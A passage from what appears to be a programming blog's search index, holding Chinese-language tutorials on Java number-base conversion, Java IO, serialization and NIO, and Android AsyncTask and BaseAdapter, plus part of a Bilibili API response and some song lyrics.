54e71584da39569p\u0026amp;platform=pc\u0026amp;upsig=efc6b85b33d839d5cc9df3a2a7a1120f\u0026amp;uparams=e,uipk,nbs,deadline,gen,os,oi,trid,platform\u0026amp;mid=133948365\u0026#34;,\u0026#34;size\u0026#34;:0,\u0026#34;mime_type\u0026#34;:\u0026#34;audio/mp4\u0026#34;,\u0026#34;width\u0026#34;:0,\u0026#34;startWithSAP\u0026#34;:0,\u0026#34;id\u0026#34;:30216,\u0026#34;height\u0026#34;:0,\u0026#34;md5\u0026#34;:\u0026#34;\u0026#34;}]},\u0026#34;accept_description\u0026#34;:[\u0026#34;高清 1080P+\u0026#34;,\u0026#34;高清 1080P\u0026#34;,\u0026#34;高清 720P\u0026#34;,\u0026#34;清晰 480P\u0026#34;,\u0026#34;流畅 360P\u0026#34;],\u0026#34;status\u0026#34;:13},\u0026#34;session\u0026#34;:\u0026#34;22707ade90b657dc027943d215e70d27\u0026#34;} console.log(json.data.dash.audio[0].base_url) console.log(json.data.dash.video[0].base_url) ","permalink":"https://xhstormr.github.io/blog/posts/bilibili-api/","summary":"","title":"BiliBili API"},{"content":"Updated on 2016-09-09\n单位 二进制 0,1 开头用 0b 表示 八进制 0,1,2,3,4,5,6,7 开头用 0 表示 十进制 0,1,2,3,4,5,6,7,8,9 十六进制 0,1,2,3,4,5,6,7,8,9,A,B,C,D,E,F 开头用 0x 表示 表示 - 235 二进制 - 11101011 八进制 - 353 十进制 - 235 十六进制 - eb 二进制 位运算 原码 按绝对值大小转换成的二进制数称为原码（正数）。\n14：00000000 00000000 00000000 00001110（正数 +14）\n反码 原码 取反 称为反码。\n14：11111111 11111111 11111111 11110001\n补码 反码 加1 称为补码（负数）。\n14：11111111 11111111 11111111 11110010（负数 -14）\nCode Integer.toBinaryString(57); 10 ➜ 2 Integer.toOctalString(57); 10 ➜ 8 Integer.toHexString(57); 10 ➜ 16 Integer.toString(57, 2); 10 ➜ 2 Integer.toString(57, 8); 10 ➜ 8 Integer.toString(57, 16); 10 ➜ 16 Integer.parseInt(\u0026#34;1101\u0026#34;, 2); 2 ➜ 10 Integer.parseInt(\u0026#34;376\u0026#34;, 8); 8 ➜ 10 Integer.parseInt(\u0026#34;ff\u0026#34;, 16); 16 ➜ 10 Integer.toString(9999, 26); 10 ➜ 26 Integer.parseInt(\u0026#34;ekf\u0026#34;, 26); 26 ➜ 10 ------------------------------------------------------- int i1 = 14; 14 int i2 = ~14 + 1; -14 ------------------------------------------------------- public class Test { private static void radix(int num, int radix) { 显示任意进制转换过程 for (; ; ) { int i = num; int i2 = num % radix; num /= radix; System.out.println(i + \u0026#34;\\t/\u0026#34; + radix + \u0026#34;=\u0026#34; + num + \u0026#34;\\t\u0026#34; + i2); if (num == 0) { break; } } } private static void int2BinaryFormat(int num) { 转为 2 进制并格式化 String string = Integer.toString(num, 2); StringBuilder stringBuilder = new StringBuilder(); for (int i = 0; i \u0026lt; 32 - string.length(); i++) { stringBuilder.append(\u0026#34;0\u0026#34;); } stringBuilder.append(string); for (int i = 0; i \u0026lt; 3; i++) { stringBuilder.insert(9 * i + 8, \u0026#34; \u0026#34;); } System.out.println(stringBuilder); } private static byte[] int2Bytes(int num) { int 转为 字节数组 byte[] bytes = new byte[4]; bytes[0] = ((byte) ((num \u0026gt;\u0026gt; 0 * 8) \u0026amp; 0xff)); bytes[1] = ((byte) ((num \u0026gt;\u0026gt; 1 * 8) \u0026amp; 0xff)); bytes[2] = ((byte) ((num \u0026gt;\u0026gt; 2 * 8) \u0026amp; 0xff)); bytes[3] = ((byte) ((num \u0026gt;\u0026gt; 3 * 8) \u0026amp; 0xff)); for (int i = 0; i \u0026lt; bytes.length; i++) { 简化后 bytes[i] = ((byte) ((num \u0026gt;\u0026gt; i * 8) \u0026amp; 0xff)); } System.out.println(Arrays.toString(bytes)); return bytes; } private static void bytes2Int(byte[] bytes) { 字节数组 还原为 int int result = 0; result += (bytes[0] \u0026amp; 0xff) \u0026lt;\u0026lt; 0 * 8; 逆操作 result += (bytes[1] \u0026amp; 0xff) \u0026lt;\u0026lt; 1 * 8; result += (bytes[2] \u0026amp; 0xff) \u0026lt;\u0026lt; 2 * 8; result += (bytes[3] \u0026amp; 0xff) \u0026lt;\u0026lt; 3 * 8; for (int i = 0; i \u0026lt; bytes.length; i++) { 简化后 result += (bytes[i] \u0026amp; 0xff) \u0026lt;\u0026lt; i * 8; } System.out.println(result); } public static void main(String[] args) { Test.radix(235, 8); System.out.println(\u0026#34;----\u0026#34;); Test.int2BinaryFormat(8143); System.out.println(\u0026#34;----\u0026#34;); byte[] c = Test.int2Bytes(8143); System.out.println(\u0026#34;----\u0026#34;); Test.bytes2Int(c); } } ---- 输出： 235\t/8=29\t3 29\t/8=3\t5 3\t/8=0\t3 ---- 00000000 00000000 00011111 11001111 ---- [-49, 31, 0, 0] ---- 8143 ------------------------------------------------------- int i1 = 0b1111; 15 （2 进制） int i2 = 01111; 585 （8 进制） int i3 = 1111; 1111（10 进制） int i4 = 0x1111; 4369（16 进制） ------------------------------------------------------- import java.util.Arrays; public class Main { public static void main(String[] args) { int[] ints = {5, 10}; System.out.println(Arrays.toString(ints)); swap(0, 1, ints); System.out.println(Arrays.toString(ints)); } private static void swap(int x, int y, int[] ints) { 使用异或运算进行交换 ints[x] = ints[x] ^ ints[y]; ints[y] = ints[x] ^ ints[y]; ints[x] = ints[x] ^ ints[y]; } } ---- 输出： [5, 10] [10, 5] ","permalink":"https://xhstormr.github.io/blog/posts/binary/","summary":"","title":"进制转换"},{"content":"Updated on 2016-11-11\nhttps://docs.oracle.com/javase/10/docs/api/java/nio/file/Path.html\nhttps://docs.oracle.com/javase/10/docs/api/java/nio/file/Files.html\nFile 用于代表文件(夹)，是文件(夹)的抽象化形式，不能用于对文件内容的访问。\nFile file = new File(\u0026#34;D:\\\\123\u0026#34;); \\ 是转义字符 File file = new File(\u0026#34;D:/123\u0026#34;); File file = new File(\u0026#34;D:/\u0026#34;, \u0026#34;123\u0026#34;); File file = new File(\u0026#34;D:\u0026#34; + File.separator + \u0026#34;123\u0026#34;); file.createNewFile(); 创建为文件 file.mkdir(); 创建为文件夹 file.mkdirs(); 递归创建文件夹 file.delete(); 删除文件(夹) file.deleteOnExit(); 退出虚拟机时删除文件(夹) file.exists(); 判断文件(夹)是否存在 file.isFile(); 判断是否为文件（不存在返回 false） file.isDirectory(); 判断是否为文件夹（不存在返回 false） file.length(); 获得文件大小，以字节为单位 file.list(); 获得文件夹下的文件(夹)名称，返回 String 数组（不是文件夹返回 null） file.listFiles(); 获得文件夹下的文件(夹)抽象，返回 File 数组（不是文件夹返回 null） file.getName(); 获得文件(夹)名称，123 file.getParent(); 获得父路径，D:\\ file.getAbsolutePath(); 获得文件(夹)的绝对路径，D:\\123 file.getCanonicalPath(); 获得文件(夹)的绝对路径（规范后） 1 B = 8 bit 1 KB = 1024 B 1 MB = 1024 KB 1 GB = 1024 MB RandomAccessFile 用于对文件内容的访问，可读可写，可以访问文件的任意位置（任意字节）。\npublic class Test { public static void main(String[] args) throws IOException { File file = new File(\u0026#34;D:/\u0026#34;, \u0026#34;123.dat\u0026#34;); RandomAccessFile randomAccessFile = new RandomAccessFile(file, \u0026#34;rw\u0026#34;); （文件,模式）rw：读写；r：只读 打开文件时指针在开头 Pointer = 0 开始写入 byte[] bytes = \u0026#34;好A1\u0026#34;.getBytes(\u0026#34;utf8\u0026#34;); 使用指定字符集 编码 为字节数组 randomAccessFile.write(bytes); 将字节数组写入 randomAccessFile.seek(8); 移动指针 randomAccessFile.write(bytes); 将字节数组写入 开始读取 randomAccessFile.seek(0); 移动指针 byte[] bytes2 = new byte[(int) randomAccessFile.length()]; randomAccessFile.read(bytes2); 将文件内容一次性读取至字节数组中 System.out.println(new String(bytes2, \u0026#34;utf8\u0026#34;)); 使用指定字符集 解码 为字符串 for (byte b : bytes2) { System.out.print(Integer.toHexString(b \u0026amp; 0xff) + \u0026#34;\\t\u0026#34;); } System.out.println(\u0026#34;\\n\u0026#34; + randomAccessFile.getFilePointer() + \u0026#34;,\u0026#34; + randomAccessFile.length() + \u0026#34;,\u0026#34; + bytes2.length); 指针位置，文件大小，数组长度 randomAccessFile.write(\u0026#39;A\u0026#39;); 写一个字节，指针移至下一位置（Char 为 2 字节，所以只会写入 Char 的低 8 位） int read = randomAccessFile.read(); 读一个字节，指针移至下一位置（填充至 Int 的低 8 位） randomAccessFile.close(); 关闭流 } } ---- 输出： 好A1 好A1 e5\ta5\tbd\t41\t31\t0\t0\t0\te5\ta5\tbd\t41\t31 13,13,13 对象的序列化和反序列化 一序列化：Object ➜ Byte 序列\u0026mdash;\u0026ndash;ObjectOutputStream.writeObject 反序列化：Byte 序列 ➜ Object\u0026mdash;\u0026ndash;ObjectInputStream.readObject 对象所属的类必须实现序列化接口（Serializable），才能够被序列化。 如果所属的类的父类已实现序列化接口，则子类便不需要再实现序列化接口。 如果所属的类的父类没有没有实现序列化接口，其父类的构造函数会被调用。 Code public class Test { public static void main(String[] args) throws UnsupportedEncodingException { String str = \u0026#34;好A1\u0026#34;; encode(str, \u0026#34;gbk\u0026#34;); 汉字 2 字节，字母和数字 1 字节 encode(str, \u0026#34;utf-8\u0026#34;); 汉字 3 字节，字母和数字 1 字节 encode(str, \u0026#34;utf-16be\u0026#34;); 汉字 2 字节，字母和数字 2 字节 byte[] bytes = \u0026#34;你好\u0026#34;.getBytes(\u0026#34;gbk\u0026#34;); 使用指定字符集 编码 为字节数组 String string = new String(bytes, \u0026#34;gbk\u0026#34;); 使用指定字符集 解码 为字符串 } private static void encode(String str, String encode) throws UnsupportedEncodingException { byte[] bytes = str.getBytes(encode); 使用指定字符集 编码 为字节数组 System.out.println(bytes.length); 数组长度 for (byte b : bytes) { System.out.print(Integer.toHexString(b \u0026amp; 0xff) + \u0026#34;\\t\u0026#34;); byte ➜ int ➜ 将前 24 个 1 清零 ➜ 以 16 进制显示 } System.out.println(); } } Tips：文件的实质就是字节序列。 ---- 输出： 4 ba\tc3\t41\t31 5 e5\ta5\tbd\t41\t31 6 59\t7d\t0\t41\t0\t31 ------------------------------------------------------- public class Test { public static void main(String[] args) { listDirectory(new File(\u0026#34;D:\\\\Download\\\\Java\u0026#34;)); } public static void listDirectory(File dir) { if (!dir.exists()) { throw new IllegalArgumentException(\u0026#34;文件夹不存在\u0026#34;); } if (!dir.isDirectory()) { throw new IllegalArgumentException(\u0026#34;不是文件夹\u0026#34;); } String[] name = dir.list(); 只能显示一级子目录 if (name != null) { for (String s : name) { System.out.println(dir + \u0026#34;\\\\\u0026#34; + s); 打印文件路径 } } File[] files = dir.listFiles(); 显示文件夹下的所有文件 if (files != null) { for (File f : files) { if (f.isDirectory()) { listDirectory(f); 递归 } else { System.out.println(f); 打印文件路径 } } } } } ------------------------------------------------------- public class Test { public static void main(String[] args) throws IOException { } private static void read(String readName) throws IOException { FileInputStream fileInputStream = new FileInputStream(readName); for (int read, m = 1; (read = fileInputStream.read()) != -1; m++) { 读取一个字节填充至 int 的低 8 位，返回读到的内容 if (read \u0026lt;= 0xf) { System.out.print(\u0026#34;0\u0026#34;); 前面补0 } System.out.print(Integer.toHexString(read) + \u0026#34;\\t\u0026#34;); if (m % 10 == 0) { System.out.println(); 换行 } } fileInputStream.close(); ---- FileInputStream fileInputStream = new FileInputStream(readName); byte[] bytes = new byte[32 * 1024]; 32KB (1KB=1024B) (1B=8b) for (int read, m = 1; (read = fileInputStream.read(bytes)) != -1; ) { 读取字节填充至数组中，返回读到的个数 for (int i = 0; i \u0026lt; read; i++, m++) { if ((bytes[i] \u0026amp; 0xff) \u0026lt;= 0xf) { System.out.print(\u0026#34;0\u0026#34;); 前面补0 } System.out.print(Integer.toHexString(bytes[i] \u0026amp; 0xff) + \u0026#34;\\t\u0026#34;); if (m % 10 == 0) { System.out.println(); 换行 } } } fileInputStream.close(); } private static void write(String writeName) throws IOException { byte[] bytes = \u0026#34;ABC123一二三\u0026#34;.getBytes(\u0026#34;utf8\u0026#34;); FileOutputStream fileOutputStream = new FileOutputStream(writeName, false); fileOutputStream.write(bytes); 将字节数组写入 fileOutputStream.write(1); 将一个字节写入 (1B=8b) fileOutputStream.close(); ---- DataOutputStream dataOutputStream = new DataOutputStream(new FileOutputStream(writeName, false)); DataInputStream dataInputStream = new DataInputStream(new FileInputStream(writeName)); dataOutputStream.writeUTF(\u0026#34;ABC123一二三\u0026#34;); 使用 utf-8 编码写入 System.out.println(dataInputStream.readUTF()); 读取 dataOutputStream.writeChars(\u0026#34;ABC123一二三\u0026#34;); 使用 utf-16be 编码写入 byte[] bytes = new byte[((int) new File(writeName).length())]; dataInputStream.readFully(bytes); 读取 System.out.println(new String(bytes, \u0026#34;utf-16be\u0026#34;)); dataInputStream.close(); dataOutputStream.close(); } private static void copy(String srcName, String destName) throws IOException { 复制文件 BufferedInputStream bufferedInputStream = new BufferedInputStream(new FileInputStream(srcName), 32 * 1024); BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(new FileOutputStream(destName, false), 32 * 1024); byte[] bytes = new byte[32 * 1024]; 32KB for (int read; (read = bufferedInputStream.read(bytes)) != -1; ) { bufferedOutputStream.write(bytes, 0, read); } bufferedOutputStream.close(); bufferedInputStream.close(); } private static String string2Unicode(String str) { 字符串转为 Unicode StringBuilder unicode = new StringBuilder(); char[] chars = str.toCharArray(); for (char c : chars) { String hex = Integer.toHexString(c); unicode.append(\u0026#34;\\\\u\u0026#34;).append(hex); } return unicode.toString(); } private static String unicode2String(String unicode) { Unicode 转为字符串 StringBuilder str = new StringBuilder(); 第一种：纯 Unicode String[] split = unicode.split(\u0026#34;\\\\\\\\u\u0026#34;); for (String s : split) { if (s.equals(\u0026#34;\u0026#34;)) { continue; } int data = Integer.parseInt(s, 16); str.append(((char) data)); } return str.toString(); ---- StringBuilder str = new StringBuilder(); 第二种：只转换了中文的 Unicode for (int j = 0, i = 0; i != unicode.length(); ) { j=指针缓存，i=指针 i = unicode.indexOf(\u0026#34;\\\\u\u0026#34;, i); if (i == -1) { return str.append(unicode.substring(j)).toString(); } str.append(unicode.substring(j, i)); String hex = unicode.substring(i + 2, i + 6); int data = Integer.parseInt(hex, 16); str.append(((char) data)); j = i += 6; } return str.toString(); } } ------------------------------------------------------- public class Student implements Serializable { 实现序列化接口 private int id; private transient int age; 用 transient 修饰的属性不会自动进行序列化，但可以手动进行序列化 private String name; public Student(int id, int age, String name) { this.id = id; this.age = age; this.name = name; } @Override public String toString() { return \u0026#34;Student{\u0026#34; + \u0026#34;id=\u0026#34; + id + \u0026#34;, age=\u0026#34; + age + \u0026#34;, name=\u0026#39;\u0026#34; + name + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#39;}\u0026#39;; } public int getId() { return id; } public void setId(int id) { this.id = id; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } private void writeObject(java.io.ObjectOutputStream s) throws java.io.IOException { 序列化方法 s.defaultWriteObject(); 自动序列化属性 s.writeInt(age); 手动序列化 transient 修饰的属性 } private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { 反序列化方法 s.defaultReadObject(); 自动反序列化属性 this.age = s.readInt(); 手动反序列化 transient 修饰的属性 } } ---- public class Test { public static void main(String[] args) throws IOException, ClassNotFoundException { save(); 保存（序列化） load(); 读取（反序列化） } private static void save() throws IOException { Student student = new Student(1, 21, \u0026#34;张三\u0026#34;); ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;D:/student.dat\u0026#34;)); objectOutputStream.writeObject(student); 保存（序列化） objectOutputStream.close(); } private static void load() throws IOException, ClassNotFoundException { ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(\u0026#34;D:/student.dat\u0026#34;)); Student student = (Student) objectInputStream.readObject(); 读取（反序列化） objectInputStream.close(); System.out.println(student); } } ---- 输出： Student{id=1, age=21, name=\u0026#39;张三\u0026#39;} NIO 用于替代原有的 IO 体系。\nPath 用于代表文件(夹)，是文件(夹)的抽象化形式，不能用于对文件内容的访问。\nPath path = Paths.get(\u0026#34;D:/123/123\u0026#34;); D:\\123\\123 Path name = path.getFileName(); 123 Path parent = path.getParent(); D:\\123 Path root = path.getRoot(); D:\\ int nameCount = path.getNameCount(); 2 Path name1 = path.getName(0); 123 Path name2 = path.getName(1); 123 Path path1 = path.resolve(\u0026#34;1.txt\u0026#34;); D:\\123\\123\\1.txt Path path2 = path.resolveSibling(\u0026#34;1.txt\u0026#34;); D:\\123\\1.txt path.toFile().toPath(); 相互转换 Files 包含一系列静态方法，用于对文件(夹)的具体操作。（注意 IO Stream 要关闭）\n递归创建目录 ---- Path path = Paths.get(\u0026#34;D:/123/123\u0026#34;); Files.createDirectories(path); 创建文件 ---- Path path = Paths.get(\u0026#34;D:/123.txt\u0026#34;); Files.createFile(path); 直接获取文件的输入流、输出流 ---- Path path = Paths.get(\u0026#34;D:/123.txt\u0026#34;); BufferedReader bufferedReader = Files.newBufferedReader(path, Charset.forName(\u0026#34;utf-8\u0026#34;)); BufferedWriter bufferedWriter = Files.newBufferedWriter(path, Charset.forName(\u0026#34;utf-8\u0026#34;)); 直接将集合内容写入 ---- Path path = Paths.get(\u0026#34;D:/123.txt\u0026#34;); List\u0026lt;String\u0026gt; list = Arrays.asList(\u0026#34;AAA\u0026#34;, \u0026#34;BBB\u0026#34;); Files.write(path, list, Charset.forName(\u0026#34;utf-8\u0026#34;), StandardOpenOption.CREATE, StandardOpenOption.APPEND); 不存在便创建，存在便追加 合并文件 ---- Vector\u0026lt;InputStream\u0026gt; inputStreams = new Vector\u0026lt;\u0026gt;(Arrays.asList(Files.newInputStream(Paths.get(\u0026#34;D:/1.txt\u0026#34;)), Files.newInputStream(Paths.get(\u0026#34;D:/2.txt\u0026#34;)), Files.newInputStream(Paths.get(\u0026#34;D:/3.txt\u0026#34;)))); Enumeration\u0026lt;InputStream\u0026gt; elements = inputStreams.elements(); 获得 Vector 中所有元素的枚举 try (SequenceInputStream sequenceInputStream = new SequenceInputStream(elements)) { 传入枚举合并为一个输入流 Files.copy(sequenceInputStream, Paths.get(\u0026#34;D:/4.txt\u0026#34;), StandardCopyOption.REPLACE_EXISTING); 复制：InputStream ➜ Path } 自动关闭资源 监视目录的增删改 ---- WatchService watchService = FileSystems.getDefault().newWatchService(); 监视服务 Path dir = Paths.get(\u0026#34;D:/1\u0026#34;); 监视目录 WatchKey watchKey = dir.register(watchService, ENTRY_CREATE, ENTRY_DELETE, ENTRY_MODIFY); 注册监视服务，返回监视事件 while (true) { 无限轮询监视事件 watchKey.pollEvents().forEach(o -\u0026gt; { 轮询 WatchEvent.Kind\u0026lt;?\u0026gt; kind = o.kind(); 事件类型 Path path = (Path) o.context(); 事件路径 System.out.printf(\u0026#34;%s__%s\\n\u0026#34;, kind, path); }); if (!watchKey.isValid()) { System.out.println(\u0026#34;失效\u0026#34;); break; } } 遍历当前目录 ---- Path path = Paths.get(\u0026#34;D:/\u0026#34;); Files.list(path).forEach(System.out::println); 只接收一个参数，不够强大 Files.newDirectoryStream(path, \u0026#34;*.txt\u0026#34;).forEach(System.out::println); 只显示 txt 文件（接收匹配字符串） Files.newDirectoryStream(path, Files::isRegularFile).forEach(System.out::println); 只显示文件（接收 Filter 接口） 递归遍历目录并访问文件属性 ---- Path path = Paths.get(\u0026#34;D:/123\u0026#34;); Files.walk(path, 3, FileVisitOption.FOLLOW_LINKS).filter(Files::isRegularFile).forEach(o -\u0026gt; { （递归目录，递归深度，跟随软连接），只显示文件 try { Map\u0026lt;String, Object\u0026gt; map = Files.readAttributes(o, \u0026#34;size,lastModifiedTime,lastAccessTime\u0026#34;); 访问文件属性 System.out.println(map + \u0026#34;__\u0026#34; + o); } catch (IOException e) { e.printStackTrace(); } }); ","permalink":"https://xhstormr.github.io/blog/posts/java-io/","summary":"","title":"Java IO Stream"},{"content":"Updated on 2016-09-02\n由于 Android 是单线程模型，只有主线程能够操作 UI，所以要避免在主线程中执行耗时操作，而是应该放到子线程中执行，以防止出现 ANR（Application Not Responding）对话框。\nMainActivity1.java public class MainActivity1 extends Activity { private ProgressBar progressBar; private MyAsyncTask myAsyncTask; @Override protected void onCreate(@Nullable Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.main_activity1); progressBar = (ProgressBar) findViewById(R.id.progressBar); myAsyncTask = new MyAsyncTask(); myAsyncTask.execute(); 执行任务 } @Override protected void onDestroy() { 与 Activity 生命周期进行绑定 super.onDestroy(); if (myAsyncTask != null \u0026amp;\u0026amp; myAsyncTask.getStatus() == AsyncTask.Status.RUNNING) { myAsyncTask.cancel(true); 标记为关闭状态 } } 输入参数，执行进度，返回结果 private class MyAsyncTask extends AsyncTask\u0026lt;Void, Integer, Void\u0026gt; { 内部类 @Override protected Void doInBackground(Void... params) { 输入参数，开始耗时操作 Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;2doInBackground\u0026#34;); for (int i = 0; i \u0026lt; 100; i++) { 模拟进度条加载 if (isCancelled()) { 是否为关闭状态 return; 尽快结束任务 } publishProgress(i); 更新执行进度 try { Thread.sleep(200); 等待 0.2 秒 } catch (InterruptedException e) { e.printStackTrace(); } } return null; 返回结果给 onPostExecute } @Override protected void onPreExecute() { 执行前的准备工作 Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;1onPreExecute\u0026#34;); super.onPreExecute(); } @Override protected void onPostExecute(Void aVoid) { 返回结果 Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;3onPostExecute\u0026#34;); super.onPostExecute(aVoid); } @Override protected void onProgressUpdate(Integer... values) { 执行进度 Log.i(\u0026#34;Tag\u0026#34;, \u0026#34;onProgressUpdate\u0026#34;); super.onProgressUpdate(values); if (isCancelled()) { 是否为关闭状态 return; 尽快结束任务 } progressBar.setProgress(values[0]); 设置进度条进度 } } } MainActivity2.java public class MainActivity2 extends Activity { private ImageView imageView; private ProgressBar progressBar; @Override protected void onCreate(@Nullable Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.main_activity2); imageView = (ImageView) findViewById(R.id.imageView); progressBar = (ProgressBar) findViewById(R.id.progressBar); String url = \u0026#34;http://blog.xhstormr.tk/uploads/children-of-the-sun1.jpg\u0026#34;; 图片地址 new MyAsyncTask().execute(url); 输入参数，执行任务 } 输入参数，执行进度，返回结果 private class MyAsyncTask extends AsyncTask\u0026lt;String, Void, Bitmap\u0026gt; { 内部类 @Override protected Bitmap doInBackground(String... params) { 输入参数，开始耗时操作 ( URL ➜ 图片) String url = params[0]; Bitmap bitmap = null; try { 开始访问网络 URLConnection connection = new URL(url).openConnection(); 获得网络连接对象 InputStream inputStream = connection.getInputStream(); 获得输入流 BufferedInputStream bufferedInputStream = new BufferedInputStream(inputStream); 包装为带缓冲区的输入流 bitmap = BitmapFactory.decodeStream(bufferedInputStream); 将输入流解析为 Bitmap inputStream.close(); 关闭输入流 bufferedInputStream.close(); 关闭输入流 } catch (IOException e) { e.printStackTrace(); } return bitmap; 返回结果给 onPostExecute } @Override protected void onPreExecute() { 执行前的准备工作 super.onPreExecute(); progressBar.setVisibility(View.VISIBLE); 显示圆形进度条 } @Override protected void onPostExecute(Bitmap bitmap) { 返回结果 super.onPostExecute(bitmap); progressBar.setVisibility(View.GONE); 隐藏圆形进度条 imageView.setImageBitmap(bitmap); 加载图片 } @Override protected void onProgressUpdate(Void... values) { 执行进度 super.onProgressUpdate(values); } } } ","permalink":"https://xhstormr.github.io/blog/posts/android-asynctask/","summary":"","title":"Android AsyncTask"},{"content":"Updated on 2016-08-31\n数据适配器把复杂的数据绑定至指定控件，是数据源和控件之间的桥梁。\nMainActivity.java public class MainActivity extends Activity { @Override protected void onCreate(@Nullable Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.main_activity); List\u0026lt;ItemBean\u0026gt; data = new ArrayList\u0026lt;\u0026gt;(); 数据源 for (int i = 0; i \u0026lt; 20; i++) { data.add(new ItemBean(R.mipmap.ic_launcher, \u0026#34;标题\u0026#34; + i, \u0026#34;内容\u0026#34; + i)); } ListView listView = (ListView) findViewById(R.id.listView); 1控件 MyBaseAdapter myBaseAdapter = new MyBaseAdapter(this, data); 2自定义适配器（上下文对象，数据源） listView.setAdapter(myBaseAdapter); 3将控件与适配器绑定 } } ItemBean.java public class ItemBean { 封装 item 数据，一个 ItemBean 对应一个页面 public int itemImage; 图片 public String itemTitle; 标题 public String itemContent; 内容 public ItemBean(int itemImage, String itemTitle, String itemContent) { 构造方法 this.itemImage = itemImage; this.itemTitle = itemTitle; this.itemContent = itemContent; } } MyBaseAdapter.java public class MyBaseAdapter extends BaseAdapter { 自定义适配器 private List\u0026lt;ItemBean\u0026gt; list; 数据源 private LayoutInflater inflater; 布局装载器（Layout ➜ View） public MyBaseAdapter(Context context, List\u0026lt;ItemBean\u0026gt; list) { 构造方法 this.list = list; this.inflater = LayoutInflater.from(context); } @Override public int getCount() { 获得页面数量 return list.size(); } @Override public Object getItem(int position) { 获得数据对象 return list.get(position); } @Override public long getItemId(int position) { 获得数据ID return position; } @Override 缓存页面 public View getView(int position, View convertView, ViewGroup parent) { 获得页面 ItemBean bean = list.get(position); 数据对象 View view = inflater.inflate(R.layout.item, null); Layout ➜ View TextView title = (TextView) view.findViewById(R.id.title); TextView content = (TextView) view.findViewById(R.id.content); ImageView image = (ImageView) view.findViewById(R.id.imageView); title.setText(bean.itemTitle); content.setText(bean.itemContent); image.setImageResource(bean.itemImage); return view; 第一种毫无优化，每次都自己创建新的 View 并查找控件 ------------------------------------------------------- ItemBean bean = list.get(position); 数据对象 if (convertView == null) { 判断页面是否被缓存 convertView = inflater.inflate(R.layout.item, null); Layout ➜ View } TextView title = (TextView) convertView.findViewById(R.id.title); TextView content = (TextView) convertView.findViewById(R.id.content); ImageView image = (ImageView) convertView.findViewById(R.id.imageView); title.setText(bean.itemTitle); content.setText(bean.itemContent); image.setImageResource(bean.itemImage); return convertView; 第二种使用了缓存页面，但依然需要查找控件 ------------------------------------------------------- ItemBean bean = list.get(position); 数据对象 ViewHolder viewHolder; 声明 ViewHolder if (convertView == null) { 判断页面是否被缓存 convertView = inflater.inflate(R.layout.item, null); Layout ➜ View viewHolder = new ViewHolder(); 实例化 ViewHolder viewHolder.title = (TextView) convertView.findViewById(R.id.title); 保存至 ViewHolder viewHolder.content = (TextView) convertView.findViewById(R.id.content); 保存至 ViewHolder viewHolder.imageView = (ImageView) convertView.findViewById(R.id.imageView); 保存至 ViewHolder convertView.setTag(viewHolder); 绑定 ViewHolder } else { viewHolder = (ViewHolder) convertView.getTag(); 取出 ViewHolder } viewHolder.title.setText(bean.itemTitle); viewHolder.content.setText(bean.itemContent); viewHolder.imageView.setImageResource(bean.itemImage); return convertView; 第三种使用了缓存页面并通过 ViewHolder 缓存页面布局 } private static class ViewHolder { 定义静态内部类 ViewHolder 保存页面布局 private ImageView imageView; 保存的控件 private TextView title; 保存的控件 private TextView content; 保存的控件 } } main_activity.xml \u0026lt;LinearLayout xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34; android:orientation=\u0026#34;vertical\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34;\u0026gt; \u0026lt;ListView android:scrollbars=\u0026#34;vertical\u0026#34; 显示垂直滚动条 android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:id=\u0026#34;@+id/listView\u0026#34;/\u0026gt; \u0026lt;/LinearLayout\u0026gt; item.xml \u0026lt;RelativeLayout xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34;\u0026gt; \u0026lt;ImageView android:src=\u0026#34;@mipmap/ic_launcher\u0026#34; android:layout_width=\u0026#34;60dp\u0026#34; android:layout_height=\u0026#34;60dp\u0026#34; android:id=\u0026#34;@+id/imageView\u0026#34;/\u0026gt; \u0026lt;TextView android:layout_toEndOf=\u0026#34;@+id/imageView\u0026#34; android:text=\u0026#34;标题\u0026#34; android:textSize=\u0026#34;30sp\u0026#34; android:gravity=\u0026#34;center\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;30dp\u0026#34; android:id=\u0026#34;@+id/title\u0026#34;/\u0026gt; \u0026lt;TextView android:layout_below=\u0026#34;@+id/title\u0026#34; android:layout_toEndOf=\u0026#34;@+id/imageView\u0026#34; android:text=\u0026#34;内容\u0026#34; android:textSize=\u0026#34;25sp\u0026#34; android:gravity=\u0026#34;start|center_vertical\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;30dp\u0026#34; android:id=\u0026#34;@+id/content\u0026#34;/\u0026gt; \u0026lt;/RelativeLayout\u0026gt; ","permalink":"https://xhstormr.github.io/blog/posts/android-baseadapter/","summary":"","title":"Android BaseAdapter"},{"content":"Updated on 2016-08-16\nComposer: Thomas J. Bergersen\nVocal: Merethe Soltvedt\nTrack: Children of the Sun\nAlbum: Children of the Sun (Single)\nFighting and burning from turning from who we really are 对抗真我而被引燃 紧接回身躲避 Cannot suppress so let\u0026#39;s find the one we have shaped so far 再难压抑 追寻吾至今塑造之唯一 Flying too close to the sun as if we\u0026#39;re invincible 极尽距离逐日而去 仿佛无可匹敌 Cannot dictate, dominate the earth that we\u0026#39;re living on 不能左右栖息之地 统治徒劳无力 We can\u0026#39;t defy the laws, cut the laws that we consummate 不可蔑视 不可背弃手中圆满法律 Around the world we grow weaker as we exterminate 远观世界 吾辈日益脆弱深陷绝地 The only thing that gives thing that brings air and life to us 无二独一 